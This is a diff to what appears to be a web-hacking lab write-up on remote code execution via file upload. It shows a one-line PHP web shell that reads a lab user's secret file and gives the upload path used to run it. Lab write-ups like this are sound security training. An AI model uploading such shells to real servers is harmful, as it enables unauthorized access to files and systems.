@@ -7,7 +7,7 @@ tags: [Web Hacking]
 
 ## Lab: Remote code execution via web shell upload
 ```php
-// we put the following code inside a .php file
+ we put the following code inside a .php file
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 // We upload it, and then access it via /files/avatars/shell.php 
 ```
